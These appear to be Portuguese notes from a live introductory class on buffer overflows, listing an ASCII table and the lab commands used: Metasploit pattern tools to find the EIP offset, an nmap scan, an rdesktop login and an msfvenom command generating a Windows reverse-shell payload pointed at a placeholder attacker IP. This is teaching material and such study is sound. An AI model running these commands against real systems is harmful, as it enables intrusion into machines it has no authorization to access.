# Live - Buffer Overflow, uma introdução ao assunto

## Tabela ASCII
Char  Dec  Oct  Hex   Linux
(nl)   10 0012  x0a   \n
(cr)   13 0015  x0d   \r
A      65 0101  x41
B      66 0102  x42
C      67 0103  x43

## Comandos utilizados

Gerando texto único para identificação da posição do EIP
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700

Checando a posição (offset) do EIP
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438

Conectando no rdesktop
rdesktop -u usuario -p senha -g 65% -x m endereco

Buscando informações do serviço
nmap -Pn -p21 -A 192.168.15.150

Gerando payload do shell reverso
msfvenom -p windows/shell_reverse_tcp LHOST=IP_atacante LPORT=Porta_atacante -b "\x00\x0a\x0d\x40" -a x86 -f python



